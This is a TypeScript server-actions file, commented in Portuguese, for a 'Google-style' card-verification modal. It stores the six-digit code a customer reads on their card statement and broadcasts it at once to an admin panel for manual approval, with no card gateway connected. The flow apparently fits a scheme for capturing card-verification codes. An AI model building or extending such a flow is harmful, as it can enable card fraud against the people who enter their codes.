"use server";

import { createSupabaseAdmin } from "@/lib/supabase/admin";
import { broadcastStatusPedido } from "@/lib/realtime-pedido";

// =====================================================================
// Server actions publicas (chamadas pelo cliente anonimo) ligadas ao
// fluxo de verificacao de cartao no modal estilo Google.
//
// Por enquanto NAO ha integracao real com gateway de cartao — quando o
// gateway novo for plugado, dispara a cobranca de teste por aqui e a
// validacao do codigo passa a ser server-side. Hoje apenas registramos
// o que o cliente preencheu pra o admin aprovar manualmente no painel.
// =====================================================================

const NUMERO_PEDIDO_REGEX = /^Z[CU][A-Z0-9]{4,30}$/;
const CODIGO_REGEX = /^\d{6}$/;

export type ResultadoVerificacao =
  | { ok: true }
  | { ok: false; erro: string };

/**
 * Marca que o cliente clicou em "Receber código" no modal — ou seja,
 * solicitou que o gateway lance a cobranca temporaria. Hoje so registra
 * o timestamp; quando o gateway de cartao for plugado, esse e o ponto
 * onde a chamada real vai acontecer.
 */
export async function marcarCodigoVerificacaoSolicitado(
  numero: string,
): Promise<ResultadoVerificacao> {
  if (!numero || !NUMERO_PEDIDO_REGEX.test(numero)) {
    return { ok: false, erro: "Numero de pedido invalido" };
  }

  const sb = createSupabaseAdmin();
  const { data: pedido, error } = await sb
    .from("pedidos")
    .select("id, status, forma_pagamento, cartao_verificacao_solicitado_em")
    .eq("numero", numero)
    .maybeSingle();

  if (error) {
    console.error("[verificacao-cartao] select pedido", error);
    return { ok: false, erro: "Erro ao consultar pedido" };
  }
  if (!pedido) return { ok: false, erro: "Pedido nao encontrado" };
  if (pedido.forma_pagamento !== "card") {
    return { ok: false, erro: "Pedido nao eh pagamento por cartao" };
  }
  if (pedido.status !== "aguardando_pagamento") {
    return { ok: false, erro: "Pedido ja foi processado" };
  }

  // Idempotente: nao sobrescreve o primeiro clique pra preservar timestamp original.
  if (pedido.cartao_verificacao_solicitado_em) {
    return { ok: true };
  }

  const { error: errUpd } = await sb
    .from("pedidos")
    .update({ cartao_verificacao_solicitado_em: new Date().toISOString() })
    .eq("id", pedido.id);

  if (errUpd) {
    console.error("[verificacao-cartao] update solicitado_em", errUpd);
    return { ok: false, erro: "Erro ao registrar solicitacao" };
  }

  await sb.from("eventos_pedido").insert({
    pedido_id: pedido.id,
    tipo: "cartao_codigo_solicitado",
    dados: {
      descricao: "Cliente clicou em 'Receber código' no modal de verificacao",
    },
  });

  return { ok: true };
}

/**
 * Recebe os 6 digitos que o cliente leu no extrato. Hoje so guarda no
 * pedido + dispara broadcast pro admin ver em tempo real. A aprovacao
 * em si continua manual (botao "Marcar como pago" no painel).
 */
export async function enviarCodigoVerificacaoCartao(
  numero: string,
  codigo: string,
): Promise<ResultadoVerificacao> {
  if (!numero || !NUMERO_PEDIDO_REGEX.test(numero)) {
    return { ok: false, erro: "Numero de pedido invalido" };
  }
  const codigoLimpo = (codigo ?? "").replace(/\D/g, "");
  if (!CODIGO_REGEX.test(codigoLimpo)) {
    return { ok: false, erro: "Codigo deve ter exatamente 6 digitos" };
  }

  const sb = createSupabaseAdmin();
  const { data: pedido, error } = await sb
    .from("pedidos")
    .select("id, status, forma_pagamento, cartao_verificacao_solicitado_em")
    .eq("numero", numero)
    .maybeSingle();

  if (error) {
    console.error("[verificacao-cartao] select pedido", error);
    return { ok: false, erro: "Erro ao consultar pedido" };
  }
  if (!pedido) return { ok: false, erro: "Pedido nao encontrado" };
  if (pedido.forma_pagamento !== "card") {
    return { ok: false, erro: "Pedido nao eh pagamento por cartao" };
  }
  if (pedido.status !== "aguardando_pagamento") {
    return { ok: false, erro: "Pedido ja foi processado" };
  }

  const agoraIso = new Date().toISOString();
  const updates: Record<string, unknown> = {
    cartao_verificacao_codigo: codigoLimpo,
    cartao_verificacao_recebido_em: agoraIso,
  };
  // Defesa: se por algum motivo o cliente pulou o passo "Receber código"
  // (race condition ou refresh), garante que o timestamp inicial existe.
  if (!pedido.cartao_verificacao_solicitado_em) {
    updates.cartao_verificacao_solicitado_em = agoraIso;
  }

  const { error: errUpd } = await sb
    .from("pedidos")
    .update(updates)
    .eq("id", pedido.id);

  if (errUpd) {
    console.error("[verificacao-cartao] update codigo", errUpd);
    return { ok: false, erro: "Erro ao registrar codigo" };
  }

  await sb.from("eventos_pedido").insert({
    pedido_id: pedido.id,
    tipo: "cartao_codigo_recebido",
    dados: {
      codigo: codigoLimpo,
      descricao: "Cliente enviou codigo de verificacao do cartao",
    },
  });

  // Aviso instantaneo pra o painel admin (eles ouvem o canal do pedido)
  await broadcastStatusPedido(sb, numero, {
    status: pedido.status as string,
    gateway_status: `CARTAO_CODIGO:${codigoLimpo}`,
  });

  return { ok: true };
}
